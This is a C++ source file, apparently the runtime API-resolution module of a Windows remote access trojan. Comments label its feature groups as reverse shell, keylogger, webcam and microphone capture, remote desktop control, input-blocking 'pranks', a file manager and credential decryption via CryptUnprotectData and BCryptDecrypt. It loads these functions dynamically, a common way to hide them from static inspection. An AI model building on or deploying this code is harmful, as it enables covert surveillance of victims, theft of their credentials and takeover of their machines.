#include "mod_dynamic_load.hpp"
#include "misc.hpp"

HRESULT WINAPI MyMFSetAttributeSize(IMFAttributes* pAttributes, REFGUID guidKey, UINT32 width, UINT32 height) {
    ULONGLONG packed = ((ULONGLONG)width << 32) | height;
    return pAttributes->SetUINT64(guidKey, packed);
}

HRESULT WINAPI MyMFGetAttributeSize(IMFAttributes* pAttributes, REFGUID guidKey, UINT32* pWidth, UINT32* pHeight) {
    ULONGLONG packed;
    HRESULT hr = pAttributes->GetUINT64(guidKey, &packed);
    if (SUCCEEDED(hr)) {
        *pWidth = (UINT32)(packed >> 32);
        *pHeight = (UINT32)(packed & 0xFFFFFFFF);
    }
    return hr;
}

HRESULT WINAPI MyMFSetAttributeRatio(IMFAttributes* pAttributes, REFGUID guidKey, UINT32 num, UINT32 den) {
    ULONGLONG packed = ((ULONGLONG)num << 32) | den;
    return pAttributes->SetUINT64(guidKey, packed);
}

HRESULT WINAPI MyMFGetAttributeRatio(IMFAttributes* pAttributes, REFGUID guidKey, UINT32* pNum, UINT32* pDen) {
    ULONGLONG packed;
    HRESULT hr = pAttributes->GetUINT64(guidKey, &packed);
    if (SUCCEEDED(hr)) {
        *pNum = (UINT32)(packed >> 32);
        *pDen = (UINT32)(packed & 0xFFFFFFFF);
    }
    return hr;
}

DynamicLoad::DynamicLoad() {
    //Cargar dlls y funciones
    LOAD_DLL(this->hKernel32DLL, "kernel32.dll");
    LOAD_DLL(this->hAdvapi32DLL, "advapi32.dll");
    LOAD_DLL(this->hShell32DLL, "shell32.dll");
    LOAD_DLL(this->hWtsapi32DLL, "Wtsapi32.dll");
    LOAD_DLL(this->hPsApiDLL, "psapi.dll");
    LOAD_DLL(this->hUser32DLL, "user32.dll");

    if (this->hKernel32DLL) {
        this->KERNEL32.pGetComputerName = (st_Kernel32::LPGETCOMPUTERNAMEA)wrapGetProcAddr(this->hKernel32DLL, "GetComputerNameA");
        this->KERNEL32.pGetModuleHandleA = (st_Kernel32::LPGETMODULEHANDLEA)wrapGetProcAddr(this->hKernel32DLL, "GetModuleHandleA");
        this->KERNEL32.pGetNativeSystemInfo = (st_Kernel32::LPGETNATIVESYSTEMINFO)wrapGetProcAddr(this->hKernel32DLL, "GetNativeSystemInfo");
        this->KERNEL32.pCreateProcessA = (st_Kernel32::LPCREATEPROCESSA)wrapGetProcAddr(this->hKernel32DLL, "CreateProcessA");
        this->KERNEL32.pOpenProcess = (st_Kernel32::LPOPENPROCESS)wrapGetProcAddr(this->hKernel32DLL, "OpenProcess");
        this->KERNEL32.pTerminateProcess = (st_Kernel32::LPTERMINATEPROCESS)wrapGetProcAddr(this->hKernel32DLL, "TerminateProcess");
        this->KERNEL32.pCloseHandle = (st_Kernel32::LPCLOSEHANDLE)wrapGetProcAddr(this->hKernel32DLL, "CloseHandle");
        this->KERNEL32.pGlobalMemoryStatusEx = (st_Kernel32::LPGLOBALMEMORYSTATUSEX)wrapGetProcAddr(this->hKernel32DLL, "GlobalMemoryStatusEx");
        this->KERNEL32.pCopyFileA = (st_Kernel32::LPCOPYFILEA)wrapGetProcAddr(this->hKernel32DLL, "CopyFileA");
        this->KERNEL32.pReadFile = (st_Kernel32::LPREADFILE)wrapGetProcAddr(this->hKernel32DLL, "ReadFile");
        this->KERNEL32.pWriteFile = (st_Kernel32::LPWRITEFILE)wrapGetProcAddr(this->hKernel32DLL, "WriteFile");
        this->KERNEL32.pDeleteFileA = (st_Kernel32::LPDELETEFILEA)wrapGetProcAddr(this->hKernel32DLL, "DeleteFileA");

        //Reverse shell
        this->KERNEL32.pCreatePipe = (st_Kernel32::LPCREATEPIPE)wrapGetProcAddr(this->hKernel32DLL, "CreatePipe");
        this->KERNEL32.pPeekNamedPipe = (st_Kernel32::LPPEEKNAMEDPIPE)wrapGetProcAddr(this->hKernel32DLL, "PeekNamedPipe");

        //Mod Camara
        this->KERNEL32.pGlobalAlloc = (st_Kernel32::LPGLOBALALLOC)wrapGetProcAddr(this->hKernel32DLL, "GlobalAlloc");
        this->KERNEL32.pGlobalFree = (st_Kernel32::LPGLOBALFREE)wrapGetProcAddr(this->hKernel32DLL, "GlobalFree");

    }

    if (this->hAdvapi32DLL) {
        this->ADVAPI32.pGetUserName = (st_Advapi32::LPGETUSERNAMEA)wrapGetProcAddr(this->hAdvapi32DLL, "GetUserNameA");
        this->ADVAPI32.pRegOpenKeyEx = (st_Advapi32::LPREGOPENKEY)wrapGetProcAddr(this->hAdvapi32DLL, "RegOpenKeyExA");
        this->ADVAPI32.pRegQueryValueEx = (st_Advapi32::LPREGQUERYVALUEEX)wrapGetProcAddr(this->hAdvapi32DLL, "RegQueryValueExA");
        this->ADVAPI32.pRegCloseKey = (st_Advapi32::LPREGCLOSEKEY)wrapGetProcAddr(this->hAdvapi32DLL, "RegCloseKey");
        this->ADVAPI32.pLookupAccountSidA = (st_Advapi32::LPLOOKUPACCOUNTSIDA)wrapGetProcAddr(this->hAdvapi32DLL, "LookupAccountSidA");
    }

    if (this->hShell32DLL) {
        this->SHELL32.pShellExecuteExA = (st_Shell32::LPSHELLEXECUTEEXA)wrapGetProcAddr(this->hShell32DLL, "ShellExecuteExA");
    }

    if (this->hWtsapi32DLL) {
        this->WTSAPI32.pWTSEnumerateProcessesA = (st_Wtsapi32::LPWTSENUMERATEPROCESSES)wrapGetProcAddr(this->hWtsapi32DLL, "WTSEnumerateProcessesA");
        this->WTSAPI32.pWTSFreeMemory = (st_Wtsapi32::LPWTSFREEMEMORY)wrapGetProcAddr(this->hWtsapi32DLL, "WTSFreeMemory");
    }

    if (this->hPsApiDLL) {
        this->PSAPI.pGetModuleFileNameExA = (st_PsApi::LPGETMODULEFILNAMEEX)wrapGetProcAddr(this->hPsApiDLL, "GetModuleFileNameExA");

    }

    this->LoadFMProcs();
}

//Bromas
void DynamicLoad::LoadFunProcs() {
    LOAD_DLL(this->hWinmmDLL, "winmm.dll");
    
    if (this->hWinmmDLL) {
        this->WINMM.pMciSendStringA = (st_Winmm::LPMCISENDSTRINGA)wrapGetProcAddr(this->hWinmmDLL, "mciSendStringA");
    }

    if (this->hUser32DLL) {
        this->USER32_FUN.pSwapMouseButton = (st_User32_Fun::LPSWAPMOUSEBUTTON)wrapGetProcAddr(this->hUser32DLL, "SwapMouseButton");
        this->USER32_FUN.pBlockInput = (st_User32_Fun::LPBLOCKINPUT)wrapGetProcAddr(this->hUser32DLL, "BlockInput");
        this->USER32_FUN.pMessageBoxA = (st_User32_Fun::LPMESSAGEBOX)wrapGetProcAddr(this->hUser32DLL, "MessageBoxA");
    }
}

void DynamicLoad::UnloadFunDlls() {
    UNLOAD_DLL(this->hWinmmDLL);
}

//Administrador de ventanas
void DynamicLoad::LoadWMProcs() {
    if (this->hUser32DLL) {
        this->USER32_WM.pIsWindowVisible = (st_User32_WM::LPISWINDOWVISIBLE)wrapGetProcAddr(this->hUser32DLL, "IsWindowVisible");
        this->USER32_WM.pGetWindowTextA = (st_User32_WM::LPGETWINDOWTEXTA)wrapGetProcAddr(this->hUser32DLL, "GetWindowTextA");
        this->USER32_WM.pGetForegroundWindow = (st_User32_WM::LPGETFOREGROUNDWINDOW)wrapGetProcAddr(this->hUser32DLL, "GetForegroundWindow");
        this->USER32_WM.pEnumWindows = (st_User32_WM::LPENUMWINDOWS)wrapGetProcAddr(this->hUser32DLL, "EnumWindows");
        this->USER32_WM.pFindWindowA = (st_User32_WM::LPFINDWINDOWA)wrapGetProcAddr(this->hUser32DLL, "FindWindowA");
        this->USER32_WM.pShowWindow = (st_User32_WM::LPSHOWWINDOW)wrapGetProcAddr(this->hUser32DLL, "ShowWindow");
    }
}

//Escritorio Remoto
void DynamicLoad::LoadRDProcs() {
    LOAD_DLL(this->hGdi32DLL, "gdi32.dll");
    LOAD_DLL(this->hGdiPlusDLL, "gdiplus.dll");
    LOAD_DLL(this->hOle32, "ole32.dll");

    if (this->hUser32DLL) {
        this->USER32_RD.pSendInput = (st_User32_RD::LPSENDINPUT)wrapGetProcAddr(this->hUser32DLL, "SendInput");
        this->USER32_RD.pGetDC = (st_User32_RD::LPGETDC)wrapGetProcAddr(this->hUser32DLL, "GetDC");
        this->USER32_RD.pReleaseDC = (st_User32_RD::LPRELEASEDC)wrapGetProcAddr(this->hUser32DLL, "ReleaseDC");
        this->USER32_RD.pGetDesktopWindow = (st_User32_RD::LPGETDESKTOPWINDOW)wrapGetProcAddr(this->hUser32DLL, "GetDesktopWindow");
        this->USER32_RD.pEnumDisplayMonitors = (st_User32_RD::LPENUMDISPLAYMONITORS)wrapGetProcAddr(this->hUser32DLL, "EnumDisplayMonitors");
        this->USER32_RD.pGetMonitorInfoA = (st_User32_RD::LPGETMONITORINFOA)wrapGetProcAddr(this->hUser32DLL, "GetMonitorInfoA");
        this->USER32_RD.pGetCursorInfo = (st_User32_RD::LPGETCURSORINFO)wrapGetProcAddr(this->hUser32DLL, "GetCursorInfo");
        this->USER32_RD.pGetIconInfo = (st_User32_RD::LPGETICONINFO)wrapGetProcAddr(this->hUser32DLL, "GetIconInfo");
        this->USER32_RD.pDrawIconEx = (st_User32_RD::LPDRAWICONEX)wrapGetProcAddr(this->hUser32DLL, "DrawIconEx");
        this->USER32_RD.pGetWindowRect = (st_User32_RD::LPGETWINDOWRECT)wrapGetProcAddr(this->hUser32DLL, "GetWindowRect");
		this->USER32_RD.pSetCursorPos = (st_User32_RD::LPSETCURSORPOS)wrapGetProcAddr(this->hUser32DLL, "SetCursorPos");
    }

    if (this->hGdi32DLL) {
        this->GDI32_RD.pCreateCompatibleDC = (st_Gdi32::LPCREATECOMPATIBLEDC)wrapGetProcAddr(this->hGdi32DLL, "CreateCompatibleDC");
        this->GDI32_RD.pCreateCompatibleBitmap = (st_Gdi32::LPCREATECOMPATIBLEBITMAP)wrapGetProcAddr(this->hGdi32DLL, "CreateCompatibleBitmap");
        this->GDI32_RD.pSelectObject = (st_Gdi32::LPSELECTOBJECT)wrapGetProcAddr(this->hGdi32DLL, "SelectObject");
        this->GDI32_RD.pGetObjectA = (st_Gdi32::LPGETOBJECTA)wrapGetProcAddr(this->hGdi32DLL, "GetObjectA");
        this->GDI32_RD.pBitBlt = (st_Gdi32::LPBITBLT)wrapGetProcAddr(this->hGdi32DLL, "BitBlt");
        this->GDI32_RD.pDeleteDC = (st_Gdi32::LPDELETEDC)wrapGetProcAddr(this->hGdi32DLL, "DeleteDC");
        this->GDI32_RD.pDeleteObject = (st_Gdi32::LPDELETEOBJECT)wrapGetProcAddr(this->hGdi32DLL, "DeleteObject");
    }

    if (this->hOle32) {
        this->OLE32.pCreateStreamOnHGlobal = (st_Ole32::LPCREATESTREAMONHGLOBAL)wrapGetProcAddr(this->hOle32, "CreateStreamOnHGlobal");
        this->OLE32.pCoInitialize = (st_Ole32::LPCOINITIALIZE)wrapGetProcAddr(this->hOle32, "CoInitialize");
        this->OLE32.pCoUninitialize = (st_Ole32::LPCOUNITIALIZE)wrapGetProcAddr(this->hOle32, "CoUninitialize");
    }

    if (this->hGdiPlusDLL) {
        this->GDIPLUS_RD.pGdiplusStartup = (st_GdiPlus::LPGDIPLUSSTARTUP)wrapGetProcAddr(this->hGdiPlusDLL, "GdiplusStartup");
        this->GDIPLUS_RD.pGdiplusShutdown = (st_GdiPlus::LPGDIPLUSSHUTDOWN)wrapGetProcAddr(this->hGdiPlusDLL, "GdiplusShutdown");
		this->GDIPLUS_RD.pGdipBitmapLockBits = (st_GdiPlus::LPGDIPBITMAPLOCKBITS)wrapGetProcAddr(this->hGdiPlusDLL, "GdipBitmapLockBits");
        this->GDIPLUS_RD.pGdipBitmapUnlockBits = (st_GdiPlus::LPGDIPBITMAPUNLOCKBITS)wrapGetProcAddr(this->hGdiPlusDLL, "GdipBitmapUnlockBits");
        this->GDIPLUS_RD.pGdipGetImageWidth = (st_GdiPlus::LPGDIPGETIMAGEWIDTH)wrapGetProcAddr(this->hGdiPlusDLL, "GdipGetImageWidth");
        this->GDIPLUS_RD.pGdipGetImageHeight = (st_GdiPlus::LPGDIPGETIMAGEHEIGHT)wrapGetProcAddr(this->hGdiPlusDLL, "GdipGetImageHeight");
        this->GDIPLUS_RD.pGdipGetImagePixelFormat = (st_GdiPlus::LPGDIPGETIMAGEPIXELFORMAT)wrapGetProcAddr(this->hGdiPlusDLL, "GdipGetImagePixelFormat");
        this->GDIPLUS_RD.pGdipCloneBitmapAreaI = (st_GdiPlus::LPGDIPCLONEBITMAPAREAI)wrapGetProcAddr(this->hGdiPlusDLL, "GdipCloneBitmapAreaI");
        this->GDIPLUS_RD.pGdipCreateBitmapFromHBITMAP = (st_GdiPlus::LPGDIPCREATEBITMAPFROMHBITMAP)wrapGetProcAddr(this->hGdiPlusDLL, "GdipCreateBitmapFromHBITMAP");
        this->GDIPLUS_RD.pGdipCreateBitmapFromScan0 = (st_GdiPlus::LPGDIPCREATEBITMAPFROMSCAN0)wrapGetProcAddr(this->hGdiPlusDLL, "GdipCreateBitmapFromScan0");
        this->GDIPLUS_RD.pGdipGetImageEncodersSize = (st_GdiPlus::LPGETIMAGEENCODERSSIZE)wrapGetProcAddr(this->hGdiPlusDLL, "GdipGetImageEncodersSize");
        this->GDIPLUS_RD.pGdipGetImageEncoders = (st_GdiPlus::LPGETIMAGEENCODERS)wrapGetProcAddr(this->hGdiPlusDLL, "GdipGetImageEncoders");
        this->GDIPLUS_RD.pGdipSaveImageToStream = (st_GdiPlus::LPGDIPSAVEIMAGETOSTREAM)wrapGetProcAddr(this->hGdiPlusDLL, "GdipSaveImageToStream");
        this->GDIPLUS_RD.pGdipDisposeImage = (st_GdiPlus::LPGDIPDISPOSEIMAGE)wrapGetProcAddr(this->hGdiPlusDLL, "GdipDisposeImage");
        this->GDIPLUS_RD.pGdipLoadImageFromStream = (st_GdiPlus::LPGDIPLOADIMAGEFROMSTREAM)wrapGetProcAddr(this->hGdiPlusDLL, "GdipLoadImageFromStream");
        this->GDIPLUS_RD.pGdipCreateBitmapFromStream = (st_GdiPlus::LPGDIPCREATEBITMAPFROMSTREAM)wrapGetProcAddr(this->hGdiPlusDLL, "GdipCreateBitmapFromStream");
    }
}

void DynamicLoad::UnloadRDDlls() {
    UNLOAD_DLL(this->hGdi32DLL);
    UNLOAD_DLL(this->hGdiPlusDLL);
    UNLOAD_DLL(this->hOle32);
}

//Microfono
void DynamicLoad::LoadMicProcs() {
    LOAD_DLL(this->hWinmmDLL, "winmm.dll");

    if (this->hWinmmDLL) {
        this->WINMMMIC.pWaveInGetDevCapsA = (st_WinmmMic::LPWAVEINGETDEVCAPSA)wrapGetProcAddr(this->hWinmmDLL, "waveInGetDevCapsA");
        this->WINMMMIC.pWaveInGetNumDevs = (st_WinmmMic::LPWAVEINGETNUMDEVS)wrapGetProcAddr(this->hWinmmDLL, "waveInGetNumDevs");
        this->WINMMMIC.pWaveInOpen = (st_WinmmMic::LPWAVEINOPEN)wrapGetProcAddr(this->hWinmmDLL, "waveInOpen");
        this->WINMMMIC.pWaveInStart = (st_WinmmMic::LPWAVEINSTART)wrapGetProcAddr(this->hWinmmDLL, "waveInStart");
        this->WINMMMIC.pWaveInStop = (st_WinmmMic::LPWAVEINSTOP)wrapGetProcAddr(this->hWinmmDLL, "waveInStop");
        this->WINMMMIC.pWaveInClose = (st_WinmmMic::LPWAVEINCLOSE)wrapGetProcAddr(this->hWinmmDLL, "waveInClose");
        this->WINMMMIC.pWaveInPrepareHeader = (st_WinmmMic::LPWAVEINPREPAREHEADER)wrapGetProcAddr(this->hWinmmDLL, "waveInPrepareHeader");
        this->WINMMMIC.pWaveInUnprepareHeader = (st_WinmmMic::LPWAVEINUNPREPAREHEADER)wrapGetProcAddr(this->hWinmmDLL, "waveInUnprepareHeader");
        this->WINMMMIC.pWaveInAddBuffer = (st_WinmmMic::LPWAVEINADDBUFFER)wrapGetProcAddr(this->hWinmmDLL, "waveInAddBuffer");
    }
}

void DynamicLoad::UnloadMicProcs() {
    UNLOAD_DLL(this->hWinmmDLL);
}

//Keylogger
void DynamicLoad::LoadKLProcs() {
    if (this->hKernel32DLL) {
        this->KERNEL32.pGetModuleHandleA = (st_Kernel32::LPGETMODULEHANDLEA)wrapGetProcAddr(this->hKernel32DLL, "GetModuleHandleA");
    }

    if (this->hUser32DLL) {
        this->USER32_KL.pGetWindowTextA = (st_User32_KL::LPGETWINDOWTEXTA)wrapGetProcAddr(this->hUser32DLL, "GetWindowTextA");
        this->USER32_KL.pGetForegroundWindow = (st_User32_KL::LPGETFOREGROUNDWINDOW)wrapGetProcAddr(this->hUser32DLL, "GetForegroundWindow");
        this->USER32_KL.pUnhookWindowsHookEx = (st_User32_KL::LPUNHOOKWINDOWSHOOKEX)wrapGetProcAddr(this->hUser32DLL, "UnhookWindowsHookEx");
        this->USER32_KL.pCallNextHookEx = (st_User32_KL::LPCALLNEXTHOOKEX)wrapGetProcAddr(this->hUser32DLL, "CallNextHookEx");
        this->USER32_KL.pSetWindowsHookExA = (st_User32_KL::LPSETWINDOWSHOOKEXA)wrapGetProcAddr(this->hUser32DLL, "SetWindowsHookExA");
        this->USER32_KL.pPostQuitMessage = (st_User32_KL::LPPOSTQUITMESSAGE)wrapGetProcAddr(this->hUser32DLL, "PostQuitMessage");
        this->USER32_KL.pPeekMessageA = (st_User32_KL::LPPEEKMESSAGEA)wrapGetProcAddr(this->hUser32DLL, "PeekMessageA");
        this->USER32_KL.pGetMessageA = (st_User32_KL::LPGETMESSAGEA)wrapGetProcAddr(this->hUser32DLL, "GetMessageA");
        this->USER32_KL.pTranslateMessage = (st_User32_KL::LPTRANSLATEMESSAGE)wrapGetProcAddr(this->hUser32DLL, "TranslateMessage");
        this->USER32_KL.pDispatchMessageA = (st_User32_KL::LPDISPATCHMESSAGEA)wrapGetProcAddr(this->hUser32DLL, "DispatchMessageA");
    }
}

//Informacion
void DynamicLoad::LoadInfoProcs() {
    LOAD_DLL(this->hBCryptDLL, "Bcrypt.dll");
    LOAD_DLL(this->hCrypt32DLL, "Crypt32.dll");
    LOAD_DLL(this->hNetApi32DLL, "Netapi32.dll");

    if (this->hBCryptDLL) {
        this->BCRYPT.pBCryptDecrypt = (st_Bcrypt::LPBCRYPTDECRYPT)wrapGetProcAddr(this->hBCryptDLL, "BCryptDecrypt");
        this->BCRYPT.pBCryptGenerateSymmetricKey = (st_Bcrypt::LPBCRYPTGENERATESYMMETRICKEY)wrapGetProcAddr(this->hBCryptDLL, "BCryptGenerateSymmetricKey");
        this->BCRYPT.pBCryptOpenAlgorithmProvider = (st_Bcrypt::LPLPBCRYPTOPENALGORITHMPROVIDER)wrapGetProcAddr(this->hBCryptDLL, "BCryptOpenAlgorithmProvider");
        this->BCRYPT.pBCryptCloseAlgorithmProvider = (st_Bcrypt::LPBCRYPTCLOSEALGORITHMPROVIDER)wrapGetProcAddr(this->hBCryptDLL, "BCryptCloseAlgorithmProvider");
        this->BCRYPT.pBCryptSetProperty = (st_Bcrypt::LPBCRYPTSETPROPERTY)wrapGetProcAddr(this->hBCryptDLL, "BCryptSetProperty");
    }

    if (hCrypt32DLL) {
        this->CRYPT32.pCryptUnprotectData = (st_Crypt32::LPCRYPTUNPROTECTDATA)wrapGetProcAddr(this->hCrypt32DLL, "CryptUnprotectData");
    }

    if (hNetApi32DLL) {
        this->NETAPI32.pNetUserEnum = (st_Netapi32::LPNETUSERENUM)wrapGetProcAddr(this->hNetApi32DLL, "NetUserEnum");
        this->NETAPI32.pNetApiBufferFree = (st_Netapi32::LPNETAPIBUFFERFREE)wrapGetProcAddr(this->hNetApi32DLL, "NetApiBufferFree");
    }
}

void DynamicLoad::UnloadInfoProcs() {
    UNLOAD_DLL(this->hBCryptDLL);
    UNLOAD_DLL(this->hCrypt32DLL);
    UNLOAD_DLL(this->hNetApi32DLL);
}

//Adm archivos
void DynamicLoad::LoadFMProcs() {
    if (this->hKernel32DLL) {
        this->KERNEL32_FM.pGetLogicalDriveStringsA = (st_Kernel32_FM::LPGETLOGICALDRIVESTRINGSA)wrapGetProcAddr(this->hKernel32DLL, "GetLogicalDriveStringsA");
        this->KERNEL32_FM.pGetVolumeInformationA = (st_Kernel32_FM::LPGETVOLUMEINFORMATIONA)wrapGetProcAddr(this->hKernel32DLL, "GetVolumeInformationA");
        this->KERNEL32_FM.pGetDriveTypeA = (st_Kernel32_FM::LPGETDRIVETYPEA)wrapGetProcAddr(this->hKernel32DLL, "GetDriveTypeA");
        this->KERNEL32_FM.pGetDiskFreeSpaceExA = (st_Kernel32_FM::LPGETDISKFREESPACEEXA)wrapGetProcAddr(this->hKernel32DLL, "GetDiskFreeSpaceExA");
        this->KERNEL32_FM.pFindFirstFileA = (st_Kernel32_FM::LPFINDFIRSTFILEA)wrapGetProcAddr(this->hKernel32DLL, "FindFirstFileA");
        this->KERNEL32_FM.pFileTimeToSystemTime = (st_Kernel32_FM::LPFILETIMETOSYSTEMTIME)wrapGetProcAddr(this->hKernel32DLL, "FileTimeToSystemTime");
        this->KERNEL32_FM.pFindNextFileA = (st_Kernel32_FM::LPFINDNEXTFILEA)wrapGetProcAddr(this->hKernel32DLL, "FindNextFileA");
        this->KERNEL32_FM.pFindClose = (st_Kernel32_FM::LPFINDCLOSE)wrapGetProcAddr(this->hKernel32DLL, "FindClose");
        this->KERNEL32_FM.pCreateDirectoryA = (st_Kernel32_FM::LPCREATEDIRECTORYA)wrapGetProcAddr(this->hKernel32DLL, "CreateDirectoryA");
        this->KERNEL32_FM.pCreateFileA = (st_Kernel32_FM::LPCREATEFILEA)wrapGetProcAddr(this->hKernel32DLL, "CreateFileA");
        this->KERNEL32_FM.pCloseHandle = (st_Kernel32_FM::LPCLOSEHANDLE)wrapGetProcAddr(this->hKernel32DLL, "CloseHandle");
        this->KERNEL32_FM.pDeleteFileA = (st_Kernel32_FM::LPDELETEFILEA)wrapGetProcAddr(this->hKernel32DLL, "DeleteFileA");
        this->KERNEL32_FM.pMoveFileA = (st_Kernel32_FM::LPMOVEFILEA)wrapGetProcAddr(this->hKernel32DLL, "MoveFileA");
        this->KERNEL32_FM.pRemoveDirectoryA = (st_Kernel32_FM::LPREMOVEDIRECTORYA)wrapGetProcAddr(this->hKernel32DLL, "RemoveDirectoryA");
    }
}

//Camara
void DynamicLoad::LoadCamProcs() {
    LOAD_DLL(this->hShlwapiDLL, "Shlwapi.dll");
    LOAD_DLL(this->hMfplatDLL, "Mfplat.dll");
    LOAD_DLL(this->hMfDLL, "Mf.dll");
    LOAD_DLL(this->hMfreadwriteDLL, "Mfreadwrite.dll");
    LOAD_DLL(this->hOle32, "Ole32.dll");
    LOAD_DLL(this->hGdiPlusDLL, "gdiplus.dll");

    if (this->hGdiPlusDLL) {
        this->GDIPLUS_RD.pGdiplusStartup = (st_GdiPlus::LPGDIPLUSSTARTUP)wrapGetProcAddr(this->hGdiPlusDLL, "GdiplusStartup");
        this->GDIPLUS_RD.pGdiplusShutdown = (st_GdiPlus::LPGDIPLUSSHUTDOWN)wrapGetProcAddr(this->hGdiPlusDLL, "GdiplusShutdown");
        this->GDIPLUS_RD.pGdipGetImageEncodersSize = (st_GdiPlus::LPGETIMAGEENCODERSSIZE)wrapGetProcAddr(this->hGdiPlusDLL, "GdipGetImageEncodersSize");
        this->GDIPLUS_RD.pGdipGetImageEncoders = (st_GdiPlus::LPGETIMAGEENCODERS)wrapGetProcAddr(this->hGdiPlusDLL, "GdipGetImageEncoders");
        this->GDIPLUS_RD.pGdipSaveImageToStream = (st_GdiPlus::LPGDIPSAVEIMAGETOSTREAM)wrapGetProcAddr(this->hGdiPlusDLL, "GdipSaveImageToStream");
        this->GDIPLUS_RD.pGdipCreateBitmapFromStream = (st_GdiPlus::LPGDIPCREATEBITMAPFROMSTREAM)wrapGetProcAddr(this->hGdiPlusDLL, "GdipCreateBitmapFromStream");
        this->GDIPLUS_RD.pGdipDisposeImage = (st_GdiPlus::LPGDIPDISPOSEIMAGE)wrapGetProcAddr(this->hGdiPlusDLL, "GdipDisposeImage");
    }

    if (this->hShlwapiDLL) {
        this->SHLWAPI.pSHCreateMemStream = (st_Shlwapi::LPSHCREATEMEMSTREAM)wrapGetProcAddr(this->hShlwapiDLL, "SHCreateMemStream");
    }

    if (this->hMfplatDLL) {
        this->MFPLAT.pMFStartup = (st_Mfplat::LPMFSTARTUP)wrapGetProcAddr(this->hMfplatDLL, "MFStartup");
        this->MFPLAT.pMFShutdown = (st_Mfplat::LPMFSHUTDOWN)wrapGetProcAddr(this->hMfplatDLL, "MFShutdown");
        this->MFPLAT.pMFCreateAttributes = (st_Mfplat::LPMFCREATEATTRIBUTES)wrapGetProcAddr(this->hMfplatDLL, "MFCreateAttributes");
        this->MFPLAT.pMFTRegisterLocalByCLSID = (st_Mfplat::LPMFTREGISTERLOCALBYCLSID)wrapGetProcAddr(this->hMfplatDLL, "MFTRegisterLocalByCLSID");
        this->MFPLAT.pMFCreateMediaType = (st_Mfplat::LPMFCREATEMEDIATYPE)wrapGetProcAddr(this->hMfplatDLL, "MFCreateMediaType");
        this->MFPLAT.pMFCreateSample = (st_Mfplat::LPMFCREATESAMPLE)wrapGetProcAddr(this->hMfplatDLL, "MFCreateSample");
        this->MFPLAT.pMFCreateMemoryBuffer = (st_Mfplat::LPMFCREATEMEMORYBUFFER)wrapGetProcAddr(this->hMfplatDLL, "MFCreateMemoryBuffer");
    }
    
    if (this->hMfDLL) {
        this->MF.pMFEnumDeviceSources = (st_Mf::LPMFENUMDEVICESOURCES)wrapGetProcAddr(this->hMfDLL, "MFEnumDeviceSources");
    }

    if (this->hMfreadwriteDLL) {
        this->MFREADWRITE.pMFCreateSourceReaderFromMediaSource =
            (st_Mfreadwrite::LPMFCREATESOURCEREADERFROMMEDIASOURCE)
            wrapGetProcAddr(this->hMfreadwriteDLL, "MFCreateSourceReaderFromMediaSource");
    }

    if (this->hOle32) {
        this->OLE32.pCoTaskMemFree = (st_Ole32::LPCOTASKMEMFREE)wrapGetProcAddr(this->hOle32, "CoTaskMemFree");
        this->OLE32.pCoCreateInstance = (st_Ole32::LPCOCREATEINSTANCE)wrapGetProcAddr(this->hOle32, "CoCreateInstance");
        this->OLE32.pCreateStreamOnHGlobal = (st_Ole32::LPCREATESTREAMONHGLOBAL)wrapGetProcAddr(this->hOle32, "CreateStreamOnHGlobal");
        this->OLE32.pCoInitialize = (st_Ole32::LPCOINITIALIZE)wrapGetProcAddr(this->hOle32, "CoInitialize");
        this->OLE32.pCoUninitialize = (st_Ole32::LPCOUNITIALIZE)wrapGetProcAddr(this->hOle32, "CoUninitialize");
    }
}

void DynamicLoad::UnloadCamPros() {
    //Descargar dlls
    UNLOAD_DLL(this->hShlwapiDLL);
    UNLOAD_DLL(this->hMfplatDLL);
    UNLOAD_DLL(this->hMfDLL);
    UNLOAD_DLL(this->hMfreadwriteDLL);
    UNLOAD_DLL(this->hOle32);
    UNLOAD_DLL(this->hGdiPlusDLL);
}

DynamicLoad::~DynamicLoad() {
    //Cerrar dlls
    UNLOAD_DLL(this->hKernel32DLL);
    UNLOAD_DLL(this->hAdvapi32DLL);
    UNLOAD_DLL(this->hShell32DLL);
    UNLOAD_DLL(this->hWtsapi32DLL);
    UNLOAD_DLL(this->hPsApiDLL);
    UNLOAD_DLL(this->hUser32DLL);
    this->UnloadFunDlls();
    this->UnloadInfoProcs();
    this->UnloadMicProcs();
    this->UnloadRDDlls();
    this->UnloadCamPros();
}
